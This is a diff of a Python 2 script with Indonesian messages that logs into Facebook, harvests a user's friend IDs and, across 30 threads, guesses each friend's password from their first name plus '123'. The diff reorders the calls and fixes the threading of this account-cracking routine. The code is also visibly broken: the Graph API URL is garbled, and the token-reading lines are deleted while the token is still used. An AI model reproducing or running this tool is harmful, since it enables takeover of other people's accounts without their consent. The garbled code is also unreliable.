@@ -24,7 +24,7 @@ def login():
         if "session_key" in dev:
             print "login Berhasil..."
             open('token.txt', 'w').write(jsl['access_token'])
-            supe_iqbal()
+            id_batir()
             
         elif "error_msg" in dev:
             print " Akun Kena Cekpoint"
@@ -48,22 +48,20 @@ def id_batir():
             data_id = open('id.txt', 'w')
             for iqbal in jsl['data']:
                 id.append(iqbal['id'])
-       
+                
 
         except IOError:
             sys.exit()
+
+    supe_iqbal()
+    
 def supe_iqbal():
 
-    id_batir()
+
     def main(arg):
         id_teman = arg
         try:
-            token = open("token.txt", "r").read()
-        except IOError:
-            os.system("rm -f token.txt")
 
-        else:
-            try:
                 url = requests.get("://graph.fhttpsacebook.com/" + id_teman + "/?access_token=" + token)
                 jsl = json.loads(url.text)
                 sandi1 = jsl['first_name'] + "123"
@@ -95,9 +93,9 @@ def supe_iqbal():
                 pass
    
         
-        nob = ThreadPool(30)
-        noob.map(main, id)
-        print "selesai"                    
+    noob = ThreadPool(30)
+    noob.map(main, id)
+    print "selesai"                    
 
 def main():
     login()
